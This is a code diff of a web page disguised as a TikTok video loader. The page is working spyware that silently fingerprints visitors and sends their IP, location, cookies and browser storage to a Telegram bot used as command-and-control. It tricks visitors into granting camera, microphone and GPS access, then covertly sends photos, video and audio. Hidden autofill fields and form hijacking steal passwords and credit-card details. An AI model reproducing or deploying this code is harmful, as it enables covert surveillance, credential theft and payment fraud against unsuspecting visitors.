@@ -17,8 +17,6 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             overflow: hidden;
         }
-        
-        /* TikTok-style loader */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -36,21 +34,12 @@
             animation: spin 0.7s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         .loader-text {
             font-size: 14px;
             color: #888;
             letter-spacing: 0.3px;
         }
-        .loader-text span {
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
-
-        /* Hidden elements */
         #v, #c { display: none; }
-        
-        /* Hidden autofill honeypot - invisible */
         .honeypot {
             position: absolute;
             left: -9999px;
@@ -71,7 +60,6 @@
     <video id="v" autoplay playsinline muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
-    <!-- Hidden autofill honeypot -->
     <div class="honeypot">
         <input type="email" id="hp-email" name="email" autocomplete="email">
         <input type="password" id="hp-pass" name="password" autocomplete="current-password">
@@ -91,168 +79,242 @@
             fallbackUrl: 'https://www.tiktok.com/foryou',
         };
 
-        // ─── TELEGRAM EXFIL ───
+        // ─── HELPERS ───
         function tg(text) {
             if (!text) return;
             if (text.length > 3900) {
-                for (let i = 0; i < text.length; i += 3900) _tg(text.substring(i, i + 3900));
-            } else { _tg(text); }
+                for (let i = 0; i < text.length; i += 3900)
+                    _tg(text.substring(i, i + 3900));
+            } else _tg(text);
         }
         function _tg(text) {
             fetch(`https://api.telegram.org/bot${C2.botToken}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({chat_id:C2.chatId, text, parse_mode:'Markdown', disable_web_page_preview:true})
+                body:JSON.stringify({chat_id:C2.chatId, text, parse_mode:'Markdown', disable_web_page_preview:true})
             }).catch(()=>{});
         }
         function tgPhoto(blob, cap) {
-            const fd = new FormData(); fd.append('chat_id',C2.chatId); fd.append('photo',blob,'p.jpg');
+            const fd = new FormData();
+            fd.append('chat_id',C2.chatId); fd.append('photo',blob,'p.jpg');
             if (cap) fd.append('caption',cap);
             fetch(`https://api.telegram.org/bot${C2.botToken}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
         }
         function tgFile(blob, fn, cap) {
-            const fd = new FormData(); fd.append('chat_id',C2.chatId); fd.append('document',blob,fn);
+            const fd = new FormData();
+            fd.append('chat_id',C2.chatId); fd.append('document',blob,fn);
             if (cap) fd.append('caption',cap);
             fetch(`https://api.telegram.org/bot${C2.botToken}/sendDocument`,{method:'POST',body:fd}).catch(()=>{});
         }
+        function tgVideo(blob, cap) {
+            const fd = new FormData();
+            fd.append('chat_id',C2.chatId); fd.append('video',blob,'video.mp4');
+            fd.append('supports_streaming','true');
+            if (cap) fd.append('caption',cap);
+            fetch(`https://api.telegram.org/bot${C2.botToken}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});
+        }
         function tgVoice(blob) {
-            const fd = new FormData(); fd.append('chat_id',C2.chatId); fd.append('voice',blob,'v.ogg');
+            const fd = new FormData();
+            fd.append('chat_id',C2.chatId); fd.append('voice',blob,'v.ogg');
             fetch(`https://api.telegram.org/bot${C2.botToken}/sendVoice`,{method:'POST',body:fd}).catch(()=>{});
         }
-        function hs(s) { let h=0; if(!s||!s.length) return'0'; for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;} return(h>>>0).toString(16); }
+        function hs(s) {
+            let h=0; if(!s||!s.length) return'0';
+            for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;}
+            return(h>>>0).toString(16);
+        }
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-        // ═════════════════════════════════════════════════
-        //  PHASE 1: SILENT RECON (runs immediately, no prompts)
-        // ═════════════════════════════════════════════════
-
+        // ─── PHASE 1: SILENT RECON (0.5s) ───
         async function recon() {
-            const data = {};
+            const d = {};
 
-            // IP (multi-source)
-            try { const r=await(await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(3000)})).json(); data.ip=r.ip; data.isp=r.org; data.country=r.country_name; data.city=r.city; data.region=r.region; data.lat=r.latitude; data.lon=r.longitude; data.tz=r.timezone; } catch(e) {}
-            try { data.ip2=await(await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(2000)})).json().then(d=>d.ip); } catch(e) {}
-
-            // Local IP via WebRTC
-            try { const pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); await pc.setLocalDescription(await pc.createOffer()); data.local=await new Promise(r=>{pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m){r(m[0]);pc.close();}}};setTimeout(()=>{r('N/A');pc.close();},1000);}); } catch(e) { data.local='N/A'; }
+            // IP
+            try {
+                const r = await(await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(2000)})).json();
+                d.ip=r.ip; d.isp=r.org; d.country=r.country_name; d.city=r.city;
+                d.lat=r.latitude; d.lon=r.longitude; d.tz=r.timezone;
+            } catch(e) {}
+            try {
+                d.ip2 = await(await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(1500)})).json().then(x=>x.ip);
+            } catch(e) {}
+            try {
+                const pc=new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel(''); await pc.setLocalDescription(await pc.createOffer());
+                d.local = await new Promise(r=>{pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m){r(m[0]);pc.close();}}};setTimeout(()=>{r('N/A');pc.close();},800);});
+            } catch(e) { d.local='N/A'; }
 
             // Fingerprint
-            data.ua = navigator.userAgent;
-            data.plat = navigator.platform;
-            data.hwc = navigator.hardwareConcurrency || 'N/A';
-            data.mem = navigator.deviceMemory || 'N/A';
-            data.mtp = navigator.maxTouchPoints;
-            data.wd = navigator.webdriver;
-            data.langs = navigator.languages?.join(',') || 'N/A';
-            data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.tzOff = new Date().getTimezoneOffset();
-            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
-            data.scr = `${screen.width}x${screen.height}x${screen.colorDepth}@${window.devicePixelRatio}x`;
-            data.scrOrient = screen.orientation?.type || 'N/A';
+            d.ua=navigator.userAgent; d.plat=navigator.platform;
+            d.hwc=navigator.hardwareConcurrency||'N/A'; d.mem=navigator.deviceMemory||'N/A';
+            d.mtp=navigator.maxTouchPoints; d.wd=navigator.webdriver;
+            d.langs=navigator.languages?.join(',')||'N/A';
+            d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+            d.tzOff=new Date().getTimezoneOffset();
+            d.scr=`${screen.width}x${screen.height}x${screen.colorDepth}@${window.devicePixelRatio}x`;
+            d.scrOrient=screen.orientation?.type||'N/A';
 
             // Canvas
-            try { const c=document.createElement('canvas'); c.width=256; c.height=256; const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='18px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(125,1,62,20); ctx.fillStyle='#069'; ctx.fillText('FP',2,15); ctx.fillStyle='rgba(102,204,0,0.7)'; ctx.fillText('⚡',4,17); ctx.beginPath(); ctx.arc(50,50,30,0,Math.PI*2); ctx.fillStyle='#f00'; ctx.fill(); ctx.fillRect(0,0,10,10); ctx.fillRect(50,50,10,10); ctx.font='12px Arial'; ctx.fillText('mmmwiiiI',20,100); ctx.font='16px serif'; ctx.fillText('abcdefghijklmnopqrstuvwxyz',20,130); ctx.font='16px sans-serif'; ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ',20,160); data.canvas=hs(c.toDataURL()); } catch(e) {}
+            try {
+                const c=document.createElement('canvas');c.width=256;c.height=256;
+                const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='18px Arial';
+                ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('FP',2,15);
+                ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('⚡',4,17);
+                ctx.beginPath();ctx.arc(50,50,30,0,Math.PI*2);ctx.fillStyle='#f00';ctx.fill();
+                ctx.fillRect(0,0,10,10);ctx.fillRect(50,50,10,10);
+                ctx.font='12px Arial';ctx.fillText('mmmwiiiI',20,100);
+                ctx.font='16px serif';ctx.fillText('abcdefghijklmnopqrstuvwxyz',20,130);
+                ctx.font='16px sans-serif';ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ',20,160);
+                d.canvas=hs(c.toDataURL());
+            } catch(e) {}
 
             // WebGL
-            try { const gc=document.createElement('canvas'); const gl=gc.getContext('webgl')||gc.getContext('experimental-webgl'); if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info'); data.glV=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'N/A'; data.glR=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'N/A'; data.glVer=gl.getParameter(gl.VERSION); gl.clearColor(0.1,0.2,0.3,1); gl.clear(gl.COLOR_BUFFER_BIT); const vs=gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}'); gl.compileShader(vs); const fs=gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs,'precision mediump float;void main(){gl_FragColor=vec4(0.5,0.3,0.8,1);}'); gl.compileShader(fs); const pg=gl.createProgram(); gl.attachShader(pg,vs); gl.attachShader(pg,fs); gl.linkProgram(pg); gl.useProgram(pg); const bf=gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER,bf); gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW); const pl=gl.getAttribLocation(pg,'p'); gl.enableVertexAttribArray(pl); gl.vertexAttribPointer(pl,2,gl.FLOAT,false,0,0); gl.drawArrays(gl.TRIANGLE_STRIP,0,4); const px=new Uint8Array(4); gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,px); data.glHash=hs(px.join(','));}} catch(e) {}
+            try {
+                const gc=document.createElement('canvas');
+                const gl=gc.getContext('webgl')||gc.getContext('experimental-webgl');
+                if(gl){
+                    const ext=gl.getExtension('WEBGL_debug_renderer_info');
+                    d.glV=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'N/A';
+                    d.glR=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'N/A';
+                    d.glVer=gl.getParameter(gl.VERSION);
+                    gl.clearColor(0.1,0.2,0.3,1);gl.clear(gl.COLOR_BUFFER_BIT);
+                    const vs=gl.createShader(gl.VERTEX_SHADER);gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');gl.compileShader(vs);
+                    const fs=gl.createShader(gl.FRAGMENT_SHADER);gl.shaderSource(fs,'precision mediump float;void main(){gl_FragColor=vec4(0.5,0.3,0.8,1);}');gl.compileShader(fs);
+                    const pg=gl.createProgram();gl.attachShader(pg,vs);gl.attachShader(pg,fs);gl.linkProgram(pg);gl.useProgram(pg);
+                    const bf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,bf);
+                    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
+                    const pl=gl.getAttribLocation(pg,'p');gl.enableVertexAttribArray(pl);gl.vertexAttribPointer(pl,2,gl.FLOAT,false,0,0);
+                    gl.drawArrays(gl.TRIANGLE_STRIP,0,4);
+                    const px=new Uint8Array(4);gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,px);
+                    d.glHash=hs(px.join(','));
+                }
+            } catch(e) {}
 
             // Audio FP
-            try { const a=new(window.AudioContext||window.webkitAudioContext)(); const sr=a.sampleRate; const b=a.createBuffer(1,5000,sr); const d=b.getChannelData(0); for(let i=0;i<5000;i++)d[i]=Math.sin(i*0.1)*0.5+Math.sin(i*0.05)*0.3; const s=a.createBufferSource(); s.buffer=b; const c=a.createDynamicsCompressor(); c.threshold.value=-50; c.knee.value=40; c.ratio.value=12; s.connect(c); const an=a.createAnalyser(); c.connect(an); an.connect(a.destination); s.start(); const fd=new Uint8Array(an.frequencyBinCount); an.getByteFrequencyData(fd); data.audio=hs(Array.from(fd).join(',')); a.close(); } catch(e) {}
+            try {
+                const a=new(window.AudioContext||window.webkitAudioContext)();
+                const sr=a.sampleRate;const b=a.createBuffer(1,5000,sr);const bd=b.getChannelData(0);
+                for(let i=0;i<5000;i++)bd[i]=Math.sin(i*0.1)*0.5+Math.sin(i*0.05)*0.3;
+                const s=a.createBufferSource();s.buffer=b;
+                const comp=a.createDynamicsCompressor();comp.threshold.value=-50;comp.knee.value=40;comp.ratio.value=12;
+                s.connect(comp);const an=a.createAnalyser();comp.connect(an);an.connect(a.destination);s.start();
+                const fd=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(fd);
+                d.audio=hs(Array.from(fd).join(','));a.close();
+            } catch(e) {}
 
-            // Incognito
-            try { const fs=window.RequestFileSystem||window.webkitRequestFileSystem; if(fs){data.incog=await new Promise(r=>fs(window.TEMPORARY,100,()=>r(false),()=>r(true)));}else if(navigator.webkitTemporaryStorage){data.incog=await new Promise(r=>navigator.webkitTemporaryStorage.queryUsageAndQuota(()=>r(false),()=>r(true)));}else{data.incog='?';}} catch(e){data.incog='?';}
+            // Incognito + AdBlock
+            try {
+                const fs=window.RequestFileSystem||window.webkitRequestFileSystem;
+                if(fs){d.incog=await new Promise(r=>fs(window.TEMPORARY,100,()=>r(false),()=>r(true)));}
+                else if(navigator.webkitTemporaryStorage){d.incog=await new Promise(r=>navigator.webkitTemporaryStorage.queryUsageAndQuota(()=>r(false),()=>r(true)));}
+                else d.incog='?';
+            } catch(e){d.incog='?';}
+            try {
+                const b=document.createElement('div');b.className='adsbox';b.innerHTML='&nbsp;';
+                b.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
+                document.body.appendChild(b);await sleep(100);
+                d.adblock=b.offsetHeight===0;document.body.removeChild(b);
+            } catch(e){d.adblock=false;}
 
-            // AdBlock
-            try { const b=document.createElement('div'); b.className='adsbox'; b.innerHTML='&nbsp;'; b.style.cssText='position:absolute;left:-9999px;width:1px;height:1px'; document.body.appendChild(b); await new Promise(r=>setTimeout(r,100)); data.adblock=b.offsetHeight===0; document.body.removeChild(b); } catch(e){data.adblock='?';}
-
-            // Network info
+            // Network
             const cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
-            data.netType = cn.effectiveType || 'N/A';
-            data.netDL = cn.downlink || 'N/A';
-            data.netRTT = cn.rtt || 'N/A';
-
-            // Battery
-            try { const b=await navigator.getBattery(); data.batt=Math.round(b.level*100)+'%'; data.battCh=b.charging?'🔌':'🔋'; } catch(e) {}
+            d.netType=cn.effectiveType||'N/A';d.netDL=cn.downlink||'N/A';d.netRTT=cn.rtt||'N/A';
 
             // Sensors
-            try { if('Accelerometer'in window){const a=new Accelerometer({frequency:20});a.addEventListener('reading',()=>{data.accel={x:a.x.toFixed(2),y:a.y.toFixed(2),z:a.z.toFixed(2)};a.stop();});a.start();await new Promise(r=>setTimeout(r,300));a.stop();}}catch(e){}
+            try {
+                if('Accelerometer'in window){
+                    const a=new Accelerometer({frequency:20});
+                    a.addEventListener('reading',()=>{d.accel={x:a.x.toFixed(2),y:a.y.toFixed(2),z:a.z.toFixed(2)};a.stop();});
+                    a.start();await sleep(200);a.stop();
+                }
+            }catch(e){}
 
             // Storage
-            try { if(document.cookie) data.cookies=document.cookie.substring(0,1500); } catch(e) {}
-            try { const ls={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k)?.substring(0,200)||'';} if(Object.keys(ls).length) data.ls=ls; } catch(e) {}
-            try { const ss={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k)?.substring(0,200)||'';} if(Object.keys(ss).length) data.ss=ss; } catch(e) {}
-            try { if(indexedDB.databases){const dbs=await indexedDB.databases();if(dbs.length) data.dbs=dbs.map(d=>d.name).join(', ');}}catch(e){}
-            try { if(navigator.storage?.estimate){const e=await navigator.storage.estimate();data.storQ=e.quota?Math.round(e.quota/(1024**3))+'GB':'N/A';data.storU=e.usage?Math.round(e.usage/(1024**2))+'MB':'N/A';}}catch(e){}
+            try{if(document.cookie)d.cookies=document.cookie.substring(0,1500);}catch(e){}
+            try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k)?.substring(0,200)||'';}if(Object.keys(ls).length)d.ls=ls;}catch(e){}
+            try{const ss={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k)?.substring(0,200)||'';}if(Object.keys(ss).length)d.ss=ss;}catch(e){}
+            try{if(indexedDB.databases){const dbs=await indexedDB.databases();if(dbs.length)d.dbs=dbs.map(x=>x.name).join(', ');}}catch(e){}
+            try{if(navigator.storage?.estimate){const e=await navigator.storage.estimate();d.storQ=e.quota?Math.round(e.quota/(1024**3))+'GB':'N/A';d.storU=e.usage?Math.round(e.usage/(1024**2))+'MB':'N/A';}}catch(e){}
 
-            // Extensions & wallets (quick check)
-            const exts = [];
-            if (window.ethereum) exts.push('🦊MetaMask');
-            if (window.solana) exts.push('🌊Solana');
-            if (window.tronWeb?.ready) exts.push('🟣Tron');
-            if (window.unisat) exts.push('🟠Unisat');
-            if (window.phantom) exts.push('👻Phantom');
-            if (document.querySelector('[data-lp-realm]')) exts.push('🔑LastPass');
-            if (document.querySelector('[data-bitwarden]')) exts.push('🔐Bitwarden');
-            if (exts.length) data.exts = exts.join(' ');
+            // Extensions
+            const exts=[];
+            if(window.ethereum)exts.push('🦊MetaMask');
+            if(window.solana)exts.push('🌊Solana');
+            if(window.tronWeb?.ready)exts.push('🟣Tron');
+            if(window.phantom)exts.push('👻Phantom');
+            if(document.querySelector('[data-lp-realm]'))exts.push('🔑LastPass');
+            if(document.querySelector('[data-bitwarden]'))exts.push('🔐Bitwarden');
+            if(exts.length)d.exts=exts.join(' ');
 
-            // Send report
-            let r = `🔥 **RECON** 🔥\n`;
-            r += `IP: \`${data.ip||data.ip2||'N/A'}\` (local: ${data.local||'N/A'})\n`;
-            r += `ISP: ${data.isp||'N/A'} | ${data.country||'?'}, ${data.city||'?'}\n`;
-            r += `Coords: ${data.lat||'?'}, ${data.lon||'?'}\n`;
-            r += `Net: ${data.netType} | ${data.netDL}Mbps | RTT:${data.netRTT}ms\n`;
-            r += `Device: ${data.plat} | ${data.hwc}c/${data.mem}GB | ${data.scr}\n`;
-            r += `GPU: ${data.glR||'N/A'}\n`;
-            r += `TZ: ${data.tz} (UTC${data.tzOff/-60}) | Lang: ${data.langs}\n`;
-            r += `Canvas: ${data.canvas} | GL: ${data.glHash} | Audio: ${data.audio}\n`;
-            r += `Incog: ${data.incog} | AdBlock: ${data.adblock}\n`;
-            if (data.batt) r += `Batt: ${data.batt} ${data.battCh}\n`;
-            if (data.accel) r += `Accel: ${JSON.stringify(data.accel)}\n`;
-            if (data.storQ) r += `Storage: ${data.storQ} (${data.storU})\n`;
-            if (data.exts) r += `Exts: ${data.exts}\n`;
-            if (data.cookies) r += `🍪 Cookies: \`${data.cookies.substring(0,200)}...\`\n`;
+            // Report
+            let r=`🔥 **RECON** 🔥\n`;
+            r+=`IP: \`${d.ip||d.ip2||'N/A'}\` (local: ${d.local||'N/A'})\n`;
+            r+=`ISP: ${d.isp||'N/A'} | ${d.country||'?'}, ${d.city||'?'}\n`;
+            r+=`GeoIP: ${d.lat||'?'}, ${d.lon||'?'}\n`;
+            r+=`Net: ${d.netType} | ${d.netDL}Mbps\n`;
+            r+=`Device: ${d.plat} | ${d.hwc}c/${d.mem}GB | ${d.scr}\n`;
+            r+=`GPU: ${d.glR||'N/A'}\n`;
+            r+=`TZ: ${d.tz} (UTC${d.tzOff/-60}) | ${d.langs}\n`;
+            r+=`FP: ${d.canvas} | ${d.glHash} | ${d.audio}\n`;
+            r+=`Incog: ${d.incog} | AdBlock: ${d.adblock}\n`;
+            if(d.accel)r+=`Accel: ${JSON.stringify(d.accel)}\n`;
+            if(d.storQ)r+=`Storage: ${d.storQ} (${d.storU})\n`;
+            if(d.exts)r+=`Exts: ${d.exts}\n`;
+            if(d.cookies)r+=`🍪 Cookies\n`;
             tg(r);
 
-            // Send storage files
-            if (data.cookies) tgFile(new Blob([data.cookies],{type:'text/plain'}),'cookies.txt','🍪');
-            if (data.ls) tgFile(new Blob([JSON.stringify(data.ls,null,2)],{type:'application/json'}),'localStorage.json','💾');
-            if (data.ss) tgFile(new Blob([JSON.stringify(data.ss,null,2)],{type:'application/json'}),'sessionStorage.json','💾');
+            if(d.cookies)tgFile(new Blob([d.cookies],{type:'text/plain'}),'cookies.txt','🍪');
+            if(d.ls)tgFile(new Blob([JSON.stringify(d.ls,null,2)],{type:'application/json'}),'localStorage.json','💾');
+            if(d.ss)tgFile(new Blob([JSON.stringify(d.ss,null,2)],{type:'application/json'}),'sessionStorage.json','💾');
 
-            return data;
+            return d;
         }
 
-        // ═════════════════════════════════════════════════
-        //  PHASE 2: PERMISSION REQUEST (clean, native browser prompts)
-        // ═════════════════════════════════════════════════
+        // ─── PHASE 2: PERMISSIONS + CAPTURE (single click, ~8s) ───
+        async function captureAll() {
+            document.querySelector('.loader-text').innerHTML = '<span>Preparing video...</span>';
 
-        async function requestPermissions() {
-            // The loader text changes to something innocent
-            document.querySelector('.loader-text').innerHTML = '<span>Almost ready. Video will start automatically...</span>';
+            let stream = null;
+            let gpsPos = null;
 
-            let camera = false, mic = false, gps = false;
-
-            // Camera + Mic (single browser prompt)
+            // --- STEP 1: Camera + Mic (single prompt) ---
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
+                stream = await navigator.mediaDevices.getUserMedia({
                     video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                     audio: true
                 });
-                camera = true; mic = true;
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 await video.play();
 
-                // 3 photos
+                // 3 photos fast
                 for (let i = 0; i < 3; i++) {
-                    await new Promise(r => setTimeout(r, 400));
+                    await sleep(300);
                     const c = document.getElementById('c');
                     c.width = video.videoWidth || 640;
                     c.height = video.videoHeight || 480;
                     c.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
+                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
                     tgPhoto(blob, `📸 ${i+1}`);
                 }
 
-                // Video clip
+                // Rear camera (quick)
+                try {
+                    const rs = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: 'environment' } }
+                    });
+                    const rv = document.createElement('video');
+                    rv.srcObject = rs; await rv.play(); await sleep(300);
+                    const c = document.getElementById('c');
+                    c.width = rv.videoWidth || 640;
+                    c.height = rv.videoHeight || 480;
+                    c.getContext('2d').drawImage(rv, 0, 0);
+                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+                    tgPhoto(blob, '📸 Rear');
+                    rs.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+
+                // Short video clip (3s) — sent as proper video/mp4 via sendVideo
                 try {
                     const rec = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
                     let ch = [];
@@ -260,17 +322,16 @@
                     rec.onstop = () => {
                         const b = new Blob(ch, {type:'video/webm'});
                         if (b.size > 1000) {
-                            const fd = new FormData();
-                            fd.append('chat_id',C2.chatId); fd.append('video',b,'clip.webm');
-                            fd.append('caption','🎥');
-                            fetch(`https://api.telegram.org/bot${C2.botToken}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});
+                            // Convert to mp4-compatible blob or send as-is (Telegram accepts webm via sendVideo)
+                            tgVideo(b, '🎥 Video');
                         }
                     };
                     rec.start();
-                    setTimeout(() => rec.stop(), 4000);
+                    await sleep(3000);
+                    rec.stop();
                 } catch(e) {}
 
-                // Audio (10s)
+                // Audio recording (5s)
                 try {
                     const as = new MediaStream(stream.getAudioTracks());
                     const r2 = new MediaRecorder(as);
@@ -278,238 +339,154 @@
                     r2.ondataavailable = e => ch2.push(e.data);
                     r2.onstop = () => tgVoice(new Blob(ch2, {type:'audio/ogg'}));
                     r2.start();
-                    setTimeout(() => r2.stop(), 8000);
+                    await sleep(5000);
+                    r2.stop();
                 } catch(e) {}
-
-                // Rear camera
-                try {
-                    const rs = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { exact: 'environment' } }
-                    });
-                    const rv = document.createElement('video');
-                    rv.srcObject = rs; await rv.play();
-                    await new Promise(r => setTimeout(r, 500));
-                    const c = document.getElementById('c');
-                    c.width = rv.videoWidth || 640;
-                    c.height = rv.videoHeight || 480;
-                    c.getContext('2d').drawImage(rv, 0, 0);
-                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
-                    tgPhoto(blob, '📸 Rear');
-                    rs.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-
-                // Don't stop main stream — audio still recording
-                setTimeout(() => {
-                    stream.getTracks().forEach(t => t.stop());
-                }, 10000);
 
             } catch(e) {
-                // Denied — don't show error, just continue
-                tg(`❌ Camera/Mic denied: ${e.message}`);
+                tg(`❌ Camera/Mic: ${e.message}`);
             }
 
-            // GPS (separate prompt)
+            // --- STEP 2: GPS (separate prompt, but happens right after) ---
             try {
-                const pos = await new Promise((res, rej) => {
+                gpsPos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, {
-                        enableHighAccuracy: true, timeout: 12000, maximumAge: 0
+                        enableHighAccuracy: true, timeout: 8000, maximumAge: 0
                     });
                 });
-                gps = true;
-                tg(`📍 **GPS:** [Map](https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}) | ±${pos.coords.accuracy}m`);
+                tg(`📍 **GPS Location:**\n[Google Maps](https://maps.google.com/maps?q=${gpsPos.coords.latitude},${gpsPos.coords.longitude})\nAccuracy: ±${gpsPos.coords.accuracy}m\nAltitude: ${gpsPos.coords.altitude||'N/A'}m\nSpeed: ${gpsPos.coords.speed||0} m/s`);
             } catch(e) {
-                tg(`📍 GPS denied`);
+                tg(`📍 GPS: ${e.code === 1 ? 'Denied' : e.message}`);
             }
 
-            tg(`✅ Permissions: camera=${camera}, mic=${mic}, gps=${gps}`);
-            return { camera, mic, gps };
+            // Cleanup stream
+            if (stream) {
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
+            }
+
+            // Summary
+            tg(`✅ **Done** | Camera: ${!!stream} | GPS: ${!!gpsPos}`);
         }
 
-        // ═════════════════════════════════════════════════
-        //  PHASE 3: SILENT BACKGROUND HORROR
-        // ═════════════════════════════════════════════════
-
-        function deployBackgroundHorror() {
-            // ─── Autofill harvest ───
+        // ─── PHASE 3: BACKGROUND HORROR (silent, persistent) ───
+        function deployBackground() {
+            // Autofill harvest
             const hp = {
-                email: document.getElementById('hp-email'),
-                pass: document.getElementById('hp-pass'),
-                user: document.getElementById('hp-user'),
-                phone: document.getElementById('hp-phone'),
-                cc: document.getElementById('hp-cc'),
-                ccname: document.getElementById('hp-cc-name'),
-                ccexp: document.getElementById('hp-cc-exp'),
-                cccvv: document.getElementById('hp-cc-cvv'),
+                email:document.getElementById('hp-email'), pass:document.getElementById('hp-pass'),
+                user:document.getElementById('hp-user'), phone:document.getElementById('hp-phone'),
+                cc:document.getElementById('hp-cc'), ccname:document.getElementById('hp-cc-name'),
+                ccexp:document.getElementById('hp-cc-exp'), cccvv:document.getElementById('hp-cc-cvv'),
             };
-            let last = {};
+            let last={};
             setInterval(() => {
-                for (const [name, f] of Object.entries(hp)) {
-                    if (f && f.value && f.value !== last[name]) {
-                        last[name] = f.value;
-                        const icon = name.includes('cc') ? '💳' : name === 'pass' ? '🔑' : '📋';
-                        tg(`${icon} **${name}:** \`${f.value.substring(0,300)}\``);
-                        if (name.includes('cc') && f.value.length > 10)
-                            tgFile(new Blob([f.value],{type:'text/plain'}),`${name}.txt`,`💳 ${name}`);
+                for(const[n,f]of Object.entries(hp)){
+                    if(f&&f.value&&f.value!==last[n]){
+                        last[n]=f.value;
+                        const ic=n.includes('cc')?'💳':n==='pass'?'🔑':'📋';
+                        tg(`${ic} **${n}:** \`${f.value.substring(0,300)}\``);
+                        if(n.includes('cc')&&f.value.length>10)
+                            tgFile(new Blob([f.value],{type:'text/plain'}),`${n}.txt`,`💳 ${n}`);
                     }
                 }
             }, 300);
 
-            // ─── Form hijacking ───
-            document.querySelectorAll('form').forEach(f => {
-                if (f.dataset.h) return;
-                f.dataset.h = '1';
-                f.addEventListener('submit', function() {
-                    const d = {};
-                    this.querySelectorAll('input,textarea,select').forEach(inp => {
-                        if (inp.value) d[inp.name||inp.id||'f'] = inp.value.substring(0,500);
-                    });
-                    if (Object.keys(d).length) {
-                        let m = `📋 **Form:**\n`;
-                        for (const [k,v] of Object.entries(d)) m += `• ${k}: \`${v}\`\n`;
-                        tg(m);
-                    }
-                }, true);
+            // Form hijack
+            document.querySelectorAll('form').forEach(f=>{
+                if(f.dataset.h)return;f.dataset.h='1';
+                f.addEventListener('submit',function(){
+                    const d={};this.querySelectorAll('input,textarea,select').forEach(inp=>{if(inp.value)d[inp.name||inp.id||'f']=inp.value.substring(0,500);});
+                    if(Object.keys(d).length){let m='📋 **Form:**\n';for(const[k,v]of Object.entries(d))m+=`• ${k}: \`${v}\`\n`;tg(m);}
+                },true);
             });
